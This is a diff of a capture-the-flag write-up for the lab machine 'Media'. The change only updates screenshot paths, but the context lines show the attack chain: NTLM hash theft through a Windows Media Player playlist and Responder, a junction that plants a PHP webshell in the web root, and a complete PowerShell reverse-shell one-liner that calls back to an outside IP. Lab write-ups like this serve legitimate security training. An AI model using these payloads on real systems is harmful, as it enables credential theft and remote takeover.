@@ -61,7 +61,7 @@ Content-Type: text/html; charset=UTF-8
 
 The site is "ProMotion Studio". Scrolling down reveals a job-application form, "Join Our Team", that accepts a video file **compatible with Windows Media Player**:
 
-![](0.png)
+![](./screens/0.png)
 
 An upload feature that explicitly mentions Windows Media Player, rather than a normal video container, is the first hint: WMP-native playlist formats (`.asx`, `.wax`, `.wvx`, `.wmx`) can reference a remote URL, including a UNC path, and WMP will fetch it automatically when the file is opened.
 
@@ -106,7 +106,7 @@ sudo responder -I tun0
 
 The file is uploaded through the "Join Our Team" form:
 
-![](medium/windows/Media/screens/1.png)
+![](./screens/1.png)
 
 A short while later, Responder captures a NetNTLMv2 hash for a user `enox`:
 
@@ -216,7 +216,7 @@ Junction created for C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 <
 
 A PHP webshell is then uploaded through the same web form used for the foothold:
 
-![](medium/windows/Media/screens/2.png)
+![](./screens/2.png)
 
 Because that upload folder is now a junction pointing at `htdocs`, the file is written directly into the live web root and is immediately reachable over HTTP:
 
@@ -224,7 +224,7 @@ Because that upload folder is now a junction pointing at `htdocs`, the file is w
 http://media.htb/webshell.php?cmd=whoami
 ```
 
-![](medium/windows/Media/screens/3.png)
+![](./screens/3.png)
 
 ```
 nt authority\local service
@@ -238,7 +238,7 @@ A PowerShell reverse shell one-liner is sent through the webshell:
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.80',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
 
-![](medium/windows/Media/screens/4.png)
+![](./screens/4.png)
 
 ```
 nc -lvnp 9001
